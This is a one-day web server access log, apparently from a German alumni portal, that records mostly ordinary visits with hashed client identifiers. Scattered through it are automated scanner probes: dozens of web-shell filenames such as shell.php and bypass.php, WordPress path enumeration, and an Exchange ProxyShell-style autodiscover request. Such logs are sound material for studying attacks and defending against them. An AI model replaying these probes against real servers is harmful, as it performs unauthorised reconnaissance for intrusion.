1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:28;/;/wp-2019.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:29;/;/geju.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:30;/;/wp.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:30;/;/hoot.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:31;/;/css.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:31;/;/log.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:32;/;/mail.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:33;/;/bak.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:33;/;/content.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:34;/;/upfile.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:35;/;/wp-conflg.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:35;/;/bypass.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:36;/;/404.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:36;/;/updates.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:37;/;/radio.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:37;/;/ae.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:37;/;/blog.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:37;/;/themes.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:38;/;/ini.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:39;/;/as.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:39;/;/shell.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:39;/;/ws.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:40;/;/1.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:40;/;/123.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:41;/;/9.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:41;/;/admin-ajax.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:42;/;/akc.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:42;/;/asd.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:42;/;/atomlib.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:43;/;/axx.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:43;/;/berax.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:44;/;/checkbox.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:44;/;/elp.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:45;/;/file4.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:46;/;/form.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:46;/;/gecko.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:46;/;/goods.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:47;/;/kyami.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:47;/;/manager.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:47;/;/new.php;GET;404
1015bc8cf0cdb572a8ca2d5deaea7d69d0467ef4ae9174e1efeb767a1e1fcc61;2025-11-22 08:38:48;/;/wp-admin.php;GET;404
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-22 08:50:48;/gruppen/hobby/malen-und-zeichnen;/gruppen/interesse/datenanalyse-und-forschung;GET;200
76e195031db9402f10b66e650e548a4a0316c8f9fb9d500b5c234339846d5c7c;2025-11-22 08:52:51;;/personen/alumni/schule/HB0001;GET;200
d4315f6375245b6b8c738c6686a540b694826bf64fea4eca888785529ca88776;2025-11-22 08:56:56;;/;GET;200
020326332b014b5f341c91c2156fa2c56029f4ea4d9bebeeb8f9d4cf510b96fe;2025-11-22 08:58:10;;/;GET;200
a422fd29867c5aa4f3a2b33ff75cdc7c36989324ec36b5d6ab188354bf23de57;2025-11-22 09:11:46;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-22 09:14:42;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/gesang;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-22 09:14:43;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 09:16:08;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/ernahrungswissenschaft;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 09:16:11;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-22 09:20:50;;/;GET;200
e09688c9865b1a1abdea7004628f9e9c729f52011da9571188194e84cd98903a;2025-11-22 09:29:51;;/rechtliches/impressum;GET;200
24a47a83c7e4eb8fc5670b19da0e7d65a2d0ddbc9ae8f62c8065cef0110fb108;2025-11-22 09:31:16;;/;GET;200
dc0de6d512764aa1e12df06d0288c7a6d512905633566cb26782d740c3db283b;2025-11-22 09:35:57;;/;GET;200
0afa02b8904ddd3cbc48314b53987a4dea0abf215edc67498edae07246efd627;2025-11-22 09:38:53;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 09:43:43;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/vogelbeobachtung;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 09:43:44;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
af0593c406b467d28ec0412d7d87155abbec51ad9d4ed9fd86953627bff875d6;2025-11-22 09:54:32;;/RDWeb/Pages/;GET;404
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 09:59:23;/;/;PROPFIND;405
0ca548601bcb761edf550f55c15e5087bbb54cf6a706378f2794a00b9369c0bc;2025-11-22 10:02:54;;/docs/img/abitraining.pdf;GET;404
1da863cb3fe4a7dc97ab0032cfb6b7f9aa5b983010a79379e99dd2372775a701;2025-11-22 10:10:36;;/personen/alumni/schule/190627;GET;200
f2849573f63d382ea1abfa524932b354685aa4750586de147190990cdc056ab9;2025-11-22 10:15:58;;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 10:20:50;/;/;PROPFIND;405
6c7cbda7ee584685f46b25f260010a044c89b8c16ecc4ba5535c50b6839a0e11;2025-11-22 10:23:57;;/?page=docs-sql;GET;200
fed61cc13a9ae4302fd85aca18ffa184c5d6f14031d9bdbdfa4979ae2fa25539;2025-11-22 10:23:58;;/?page=docs-sql;GET;200
6c8b61d01efc5b9b38e71e3ce1d6dfee9217697d50118401d890c44f9c9c21c0;2025-11-22 10:27:51;;/personen;GET;200
c0da68b5b3c355401e734ac26819fe56047d8fb9232911573133efa25098e17f;2025-11-22 10:39:57;/veranstaltungen/details/wohnzimmerkonzert;/veranstaltungen/details/wohnzimmerkonzert;GET;200
a3f7964d75549dc72a66a74fa0018647483eab378a9fa64985fbc88c68635ef3;2025-11-22 10:42:26;;/;GET;200
65601f407ee9919dbe71906e34994cda47892cb45331edb980a6597ce65a2ea4;2025-11-22 10:48:17;;/personen/alumni/schule/59043;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 10:53:02;/;/;PROPFIND;405
0f330dc3dc18b424f2af8731d520a85fc48b7e3f4a7e8cb0d70f088a0cd2989d;2025-11-22 10:53:06;/veranstaltungen/details/wartende-das-theaterstuck;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
dc0de6d512764aa1e12df06d0288c7a6d512905633566cb26782d740c3db283b;2025-11-22 10:56:54;;/;GET;200
99b494c3a49a900d3c2ff5d6367e3dd06d38f27f5c8b23c7ec4abe18d5871c78;2025-11-22 10:57:22;;/wp-login.php;GET;404
99b494c3a49a900d3c2ff5d6367e3dd06d38f27f5c8b23c7ec4abe18d5871c78;2025-11-22 10:57:22;;/wp-login.php;GET;404
be38b96435f9f356e1d63726c477013b15b6199023d4c44c9ecf597e03009b42;2025-11-22 11:02:57;;/;GET;200
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:43;;/;GET;200
d22d10da15bbaa089cc42129362a5d3dc473986f1dc90667f6d9a284cb3b202d;2025-11-22 11:09:49;;/;GET;200
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:51;;/;GET;200
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:55;;/;GET;200
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:58;;/webui;GET;404
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:59;;/;GET;200
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:59;;/owa/;GET;404
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:09:59;;/webui;GET;404
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:10:00;;/owa/;GET;404
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:10:00;;/;GET;200
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:10:00;;/owa/;GET;404
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:10:01;;/owa/;GET;404
a08c3a490e1fec52039c939b3ff8e42852377557a12b586e1d8c17981f8a6fbd;2025-11-22 11:10:10;;/;GET;200
0019b336654adc72eb2c9275330c98bcd2b281344d45c2f346c89752642742ce;2025-11-22 11:25:28;;/personen/alumni/schule/185826;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-22 11:25:52;;/;GET;200
7ec26adb2a9b77abb0244f4dc8ac88dda1888dbc92d02dad7b7a6f2aae2caedb;2025-11-22 11:29:28;/;/personen/alumni/schule/04A04;GET;200
d7c0bae0269d8cf8d5e4f8a55485115f677c76a5710f12064bd5e7717a0ba757;2025-11-22 11:35:45;;/;GET;200
e748fb691ef70f0d5239c24ac7599b288afc79a292862f6bba34987ea8a1b6f7;2025-11-22 11:37:42;;/;GET;200
8e3be7c996b16b01e97e5d0d597cd3d9e74d34d5fefdf266be3f1b7db5977869;2025-11-22 11:49:17;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 11:51:35;/;/;PROPFIND;405
3fa6639754bb8028bd341abade387502c1ef0fa522f62b5f3917ad3bc480bba0;2025-11-22 12:06:45;;/;GET;200
a7b2e5c523576d67ad9691b69c0ec26ab45043a98d3b3bc9e1912f0845774b86;2025-11-22 12:15:10;;/personen/alumni/schule/190627;GET;200
34bb7fac8b3cf472448fc2d1267048642dd401ca723330be610e15ec6fad28b9;2025-11-22 12:17:10;;/;GET;200
34bb7fac8b3cf472448fc2d1267048642dd401ca723330be610e15ec6fad28b9;2025-11-22 12:17:14;;/;GET;200
05eda8dad417dbf163cfced3cb1ffd4e6909c7db7ba79e77a3d1c70b05ff8e8b;2025-11-22 12:17:32;;/ReportServer;GET;404
964c93f61a4a54a1dc8ed3854301d4e67ce8b1a8508d1211760f76cae76aed9f;2025-11-22 12:21:10;;/;GET;200
989a1f69071e6332e4f080046ab97b8fb8a78805c64b735cc4d35d9719770f3d;2025-11-22 12:28:33;/;/;GET;200
d590978121d2494874153b19da7236689348d9707f41d22c0d972509f5fd8d35;2025-11-22 12:38:11;/;/;GET;200
8c826ad0bf59ab756b747e47932db8b71a3e7bf3a30289ebda78237b9aaae7fa;2025-11-22 12:49:32;;/personen/alumni/schule/HB0001;GET;200
8e3be7c996b16b01e97e5d0d597cd3d9e74d34d5fefdf266be3f1b7db5977869;2025-11-22 12:51:53;;/themen/details/der-start-ins-studium;GET;200
71a78a92788e71d206f156ad5aff3ada18277372413bccabc5a6af1db94d24ef;2025-11-22 13:01:30;;/;GET;200
671cef73f044f48d0802e94cf6035fe035ef6b7ce88bc04898db2e74c3c8d1cd;2025-11-22 13:17:22;/;/;GET;200
8bc49266678074d7689cd0523c1795889570f6f321da19c6d273901c099c231c;2025-11-22 13:22:33;;/rechtliches/impressum;GET;200
10c8573bee024fdf9dd50710901dfec91b16fc87decbf1ece44b38b172fbd52f;2025-11-22 13:26:36;;/gruppen;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 13:28:51;/;/;PROPFIND;405
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-22 13:32:51;/personen/all/5;/personen/all/3;GET;200
e65f4b389e5be38fa37fdf69355549018025bd72baf270b1aa47f9d8d63c7b10;2025-11-22 13:51:34;;/;GET;200
1ce72c47cac058c397736cccde496a04968889ee64643e3f04adfa1e6e28a430;2025-11-22 13:53:41;;/personen/alumni/schule/5503;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 14:08:47;/;/;PROPFIND;405
799a6b2d489c7f50e4acc2f5da5395c45abe593416e9456389edeabee71fdee2;2025-11-22 14:19:48;;/;GET;200
e0d7b574cebd60d6a7a033c9cbdb05b0c16582bcaca16a5a639ab52b7573957e;2025-11-22 14:28:47;;/.well-known/passkey-endpoints;GET;404
b33cfa493ffe7b8cb32a1db724ba6c7b275702274be5736f3394358fc0a6419f;2025-11-22 14:28:47;;/;GET;200
452393d7388d236bde7cff5f740ebed42c451dc859c93c366c8878a1e44326b7;2025-11-22 14:30:00;;/;GET;200
38a55b8a7ff979e8f34b2765fdf19b288d21aba7903bae0cc633aa4c00381aa2;2025-11-22 14:30:14;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
d8a115880ec4f11b1b43c956a3a57c24ad4e112e5d1f6d6fe151f515f8544eec;2025-11-22 14:33:25;;/;GET;200
fed61cc13a9ae4302fd85aca18ffa184c5d6f14031d9bdbdfa4979ae2fa25539;2025-11-22 14:33:28;;/;GET;200
a4bdc9d5f6f6cb5b63370df61d0bec9016f69606c1e4104528663d10573f8bfe;2025-11-22 14:34:28;;/personen/alumni/schule/190627;GET;200
c58e203aab6c84cbb66a21b21db02e821ef4a20dff07a937386ddc3c1ce17bba;2025-11-22 14:35:53;;/;GET;200
2c320d5961c5aaeb1689efe1746f7985571263aba051d84d7c55b4974e36d534;2025-11-22 14:41:06;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
73b2efc26e85c38f5f1d2ca2ec87875903f278ba7de635b0a2857dfd97d69f98;2025-11-22 14:46:36;;/themen/details/abschied-aus-moabit;GET;200
a205f1b652cf37f6464751ca46ec451e0febe995217327de1cdb3413da19a29c;2025-11-22 14:58:49;;/;GET;200
eb639149a613179817bc4e64920b2f932d6577755ff6999fed00f2838d8a8595;2025-11-22 15:09:46;;/personen/alumni/schule/59043;GET;200
91d27687d44cf41892ca112bc3e718e6968cc306c7f217261790890f31adf1c8;2025-11-22 15:14:51;/;/;GET;200
55ba1f31e330352661b43d3275dad2a303675546c75fe98bef1d75f73056674c;2025-11-22 15:26:12;;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 15:39:04;/;/;PROPFIND;405
9253ebbccba55298ddc9dfce50a807ec14c9246e3f3c6c231a09e735026d1da4;2025-11-22 15:39:09;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b117a06ebb9fe112ed1ecf218ddc5e6fdfcd0ed08650eaf5d4986151e071022f;2025-11-22 15:43:29;;/login;GET;200
45759a015183e6dc8d2f80dc75f789f7699366df4cdc51d68c5c0a8d46e1b70c;2025-11-22 15:44:13;;/personen/alumni/schule/185826;GET;200
bcb16361635b62ac94a612fcfe4b7dbab0673db71f0039b54f40b5369756e0c3;2025-11-22 15:49:01;/;/;GET;200
a9e978e58412d628dd123841e8140ed9130e978b9992d40530554023cc682402;2025-11-22 16:12:38;;/;GET;200
ecb03b0afc89b896c08466bb272b4ea8e8d851587b3053cd75f56735a03ca612;2025-11-22 16:14:02;;/;GET;200
0ade572e6b522ddcb8a16426e0ae35809fe803a1646eea32795ec153a6ba832c;2025-11-22 16:26:36;;/;GET;200
9e789348d37c10e08720df56d7f690c3c3f19a24a0e0956bcce51ea3da8facb8;2025-11-22 16:26:49;;/personen/alumni/schule/190627;GET;200
9c072315f77814208e6e51009667b9181eb2f1d92e78b04635c96719c3f7b527;2025-11-22 16:28:44;;/;GET;200
a16b32683bebd9cef5456130a448b5313720003e9cf86edf52631100ecfaad24;2025-11-22 16:33:04;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
94e382f58c667dffbd6abb636ec39f0b8d752af5370a563a6b988faa40c45aba;2025-11-22 16:47:59;;/;GET;200
fd926653b467a620bd6221f6087c32589cfd0b2da64cf92bfdfa1401b0051c13;2025-11-22 16:55:42;;/personen;GET;200
ee28776edf52e5daaa0842a1efaee536b8bd05cf0e58f6b6f314aee12a46cf1b;2025-11-22 17:04:02;;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 17:04:12;/;/;PROPFIND;405
44ff2709cdb859c57cbfbc3ebf533d33410df4b606aa88000acfbdef1fc21ee7;2025-11-22 17:05:28;;/personen/alumni/schule/HB0001;GET;200
1a65a19379ea25b8f2ae359ec72fb02478e4fb76662dfce5e9bb58609ee8e765;2025-11-22 17:05:40;;/;GET;200
6ca04099a0d612514779011a6c85df05740aa0f541385c233d7e8fd3bb69d50d;2025-11-22 17:11:18;;/gruppen/hobby/abschlussfest;GET;302
302ac7bd15beee1e6c060cda91e1497cb27cf06cef74b439d56437188cefeff6;2025-11-22 17:13:54;;/;GET;200
c671ef29c7cd3bedfc416a3d5cc2b2d0a150d048f88b5600b97bf38e00c49157;2025-11-22 17:15:45;/themen/details/erfolgreich-durch-die-abiturprufungen;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
a11d57f735c53579740325fd82ba4a7573b09ffec1a58049d35b0a42a3400f4c;2025-11-22 17:34:07;;/;GET;200
a4566f86a739defa4e4e6d10d8b50356e8c9fe7c77df5071fc740643dab686bf;2025-11-22 17:34:20;/themen/details/fotografie-als-kunst-und-ausdruck;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
24c88dcb4b763df3c715cb77fe85fa64d52d6efe3ee3e0947ef7dd08f0685969;2025-11-22 17:35:47;;/;GET;200
e3ef46922bcce813228e918f434398046232377569b2d24a43c2a64549347419;2025-11-22 17:38:04;;/;GET;200
08fb9e7a94938ee9167083457dfafeeb07fcc029e657d94aac4bd0be20d4b343;2025-11-22 17:39:34;;/personen/alumni/schule/4240404;GET;200
5ffa729dedb192e4e9a281356e44a382481aaf132f657968a94f9db8e9d9245a;2025-11-22 17:45:29;;/rechtliches/impressum;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-22 17:46:34;;/;GET;200
7e8d1e5c54fe99c2a561b968eeedc5b461da5dd4f6031805b4ddb1a7ff76b60a;2025-11-22 17:49:10;;/media/cache/avatar/images/user/28.jpeg;GET;404
5c25c585cce6421723522b1050a614e8248d41b12ea0877b2d6775471f468257;2025-11-22 17:49:55;;/;GET;200
5c25c585cce6421723522b1050a614e8248d41b12ea0877b2d6775471f468257;2025-11-22 17:50:11;;/login;GET;200
07a2bc25b91d6c41bc29e4033d4c452fa2318dfa68773c110e0acfe92f8a6a67;2025-11-22 17:51:19;;/personen/alumni/schule/HS001;GET;200
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 17:56:21;127.0.0.1;/param[]=0;GET;404
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 17:56:21;127.0.0.1;/;GET;200
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 17:56:21;127.0.0.1;/;GET;200
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 17:56:36;127.0.0.1;/;GET;200
63f0eb108960c62d05be79fe1555b9b457ad7e266896c0fb59d7d90ca927f5b8;2025-11-22 17:56:38;127.0.0.1;///////this-should-not-exist,.%3C%3E%21@;GET;404
592802d4d60c2eb7687cd5eccdef38bb9c633791ebeb330c9437c5603c700800;2025-11-22 17:59:21;;/personen/alumni/schule/5820;GET;200
c9585288179f168330fe4bccba2c3c8dbc443e70cb9617ce2b06ed1c29134ed3;2025-11-22 18:02:45;;/;GET;200
cd18b401d002af635a0bb9408a995716dbd33b945a9c065cf593e276ee6ce53f;2025-11-22 18:03:02;/themen/details/bucher-auf-dem-abstellgleis;/themen/details/bucher-auf-dem-abstellgleis;GET;200
04be38869d6c68b1788fa435c3d9bacebc270e916618c0629a2ce7b135910970;2025-11-22 18:03:44;;/login;GET;200
c3aab7cc9d7670378fb4d8a48f0745a9532b240b0a3e9c24df4f75fc40d3afd9;2025-11-22 18:03:49;;/login;GET;200
24bde7676e5147d858a878657c6e18fa544df0ae0f80237c54efd6954c7ef28b;2025-11-22 18:03:55;;/;GET;200
4a4f579dde954a72d687526720beb2efe6ac5d7bb646762a43fff0682cbf4633;2025-11-22 18:05:05;/themen/details/stipendien-fur-den-zweiten-bildungsweg;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:14;;/;GET;200
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:14;;//wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:15;;//xmlrpc.php?rsd;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:15;;/;GET;200
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:15;;//blog/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:15;;//web/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:16;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:16;;//website/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:16;;//news/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:16;;//2018/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:17;;//2019/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:17;;//shop/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:17;;//wp1/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:17;;//test/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:17;;//media/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:18;;//wp2/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:18;;//site/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:18;;//cms/wp-includes/wlwmanifest.xml;GET;404
8fbc2cd1055e22d8958d8c5ef5696895226afc91d0817f3aac090c40f6a71de8;2025-11-22 18:10:18;;//sito/wp-includes/wlwmanifest.xml;GET;404
aadd808e8ab0c87f0f69370a1301fa6c4b4c24137158821aac7e06ac96404ad1;2025-11-22 18:10:48;;/personen/alumni/schule/5514;GET;200
2e72d83e60acb3c63a28c989bc4dea1f6117901b4d1e87aae5cb88cf82bbb1cc;2025-11-22 18:12:09;;/gruppen/interesse/entrepreneurship;GET;200
aecd27b67d857b019c742efb08a0cda3ca285d533291a9d637de22ad5b670a0e;2025-11-22 18:12:36;/themen/details/der-start-ins-studium;/themen/details/der-start-ins-studium;GET;200
15c9da74ba8bf4cc1376c9e166aee28e9d29f6f466c1520bc6daa8089723419f;2025-11-22 18:15:00;/themen/details/abschied-aus-moabit;/themen/details/abschied-aus-moabit;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-22 18:19:42;;/;GET;200
9848721278c322723fb490d875f7a6fe02087753abbc23ec35875ef817ce4622;2025-11-22 18:20:07;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
154660aba70077f1176aada772e89f8ca4632c7d72f3a6148a10bf263d41704a;2025-11-22 18:21:32;/themen/details/was-kommt-nach-dem-abitur;/themen/details/was-kommt-nach-dem-abitur;GET;200
d30dbe3514a9a4d62dfc56bbfe7dd2f6482885f1d7a007b4b793da9d9d5356cd;2025-11-22 18:21:32;;/;GET;200
